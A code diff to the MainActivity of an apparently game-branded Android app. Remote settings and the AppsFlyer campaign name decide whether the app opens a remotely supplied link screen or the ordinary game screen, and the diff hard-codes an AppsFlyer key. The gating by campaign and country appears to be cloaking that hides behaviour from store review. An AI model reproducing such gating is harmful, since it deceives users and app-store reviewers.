@@ -10,7 +10,6 @@ import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.ngelgames.herocant.InMainClass.Companion.C1
 import com.ngelgames.herocant.InMainClass.Companion.MAIN_ID
 import com.ngelgames.herocant.InMainClass.Companion.appsCheck
-import com.ngelgames.herocant.InMainClass.Companion.appsKey
 import com.ngelgames.herocant.InMainClass.Companion.link
 import com.ngelgames.herocant.databinding.ActivityMainBinding
 import com.orhanobut.hawk.Hawk
@@ -33,18 +32,9 @@ class MainActivity : AppCompatActivity() {
                 job
         }
 
-        val set = getSharedPreferences("PREFS_NAME", 0)
-
-
-
-        if (set.getBoolean("my_first_time", true)) {
-
-           AppsFlyerLib.getInstance()
+         AppsFlyerLib.getInstance()
                 .init("Aax8r92Rg4Fz8QpENmddFL", conversionDataListener, applicationContext)
-                AppsFlyerLib.getInstance().start(this@MainActivity)
-
-            set.edit().putBoolean("my_first_time", false).apply()
-        }
+            AppsFlyerLib.getInstance().start(this)
 
     }
 
@@ -84,13 +74,10 @@ class MainActivity : AppCompatActivity() {
         val linkView = retroBuildTwo.getDataDev().body()?.view
         Log.d("Data", "getDataDev: $linkView")
         val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker
-        val appskey = retroBuildTwo.getDataDev().body()?.appskey
-        Hawk.put(appsKey, appskey)
         Hawk.put(appsCheck, appsChecker)
         Hawk.put(link, linkView)
         Log.d("Data in Hawk", "getDataDev: ${Hawk.get(link, "null")}")
         Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsCheck, "null")}")
-        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsKey, "null")}")
         val retroData = retroBuildTwo.getDataDev().body()?.geo
         Log.d("Data", retroData.toString())
         return retroData
@@ -101,15 +88,15 @@ class MainActivity : AppCompatActivity() {
         val countyCode: String = getData().toString()
         val countriesPool = getDataDev().toString()
         val appsCh = Hawk.get(appsCheck, "null")
-        val naming: String? = Hawk.get(C1)
+        var naming: String? = Hawk.get(C1)
 
         getAdId()
         if (appsCh == "1") {
             val executorService = Executors.newSingleThreadScheduledExecutor()
             executorService.scheduleAtFixedRate({
                 if (naming != null) {
-                    Log.d("TestInUIHawk", naming)
-                    if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
+                    Log.d("TestInUIHawk", naming.toString())
+                    if (naming!!.contains("tdb2") || countriesPool.contains(countyCode)) {
                         Log.d("Apps Checker", "naming: $naming")
                         executorService.shutdown()
                         startActivity(Intent(this@MainActivity, ITIS::class.java))
@@ -120,23 +107,12 @@ class MainActivity : AppCompatActivity() {
                         finish()
                     }
                 } else {
-                    Log.d("TestInUIHawk", "Received null")
+                    naming = Hawk.get(C1)
+                    Log.d("TestInUIHawk", "Received null $naming")
                 }
 
             }, 0, 2, TimeUnit.SECONDS)
         }
-
-//            else {
-//                if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
-//                        Log.d("Apps Checker of second open", "naming: $naming")
-//                        startActivity(Intent(this@MainActivity, ITIS::class.java))
-//                        finish()
-//                    } else {
-//                        startActivity(Intent(this@MainActivity, URam::class.java))
-//                        finish()
-//                    }
-//                }
-
          else if (countriesPool.contains(countyCode)) {
             startActivity(Intent(this@MainActivity, ITIS::class.java))
             finish()
@@ -145,11 +121,9 @@ class MainActivity : AppCompatActivity() {
             finish()
         }
     }
-}
 
-    val conversionDataListener = object : AppsFlyerConversionListener {
+    private val conversionDataListener = object : AppsFlyerConversionListener {
         override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
-            Log.d("dev_test", "onConversionDataHUISOSI: ${data.toString()}")
             val dataGotten = data?.get("campaign").toString()
             Hawk.put(C1, dataGotten)
         }
@@ -165,6 +139,9 @@ class MainActivity : AppCompatActivity() {
         override fun onAttributionFailure(p0: String?) {
         }
     }
+}
+
+
 
 
 
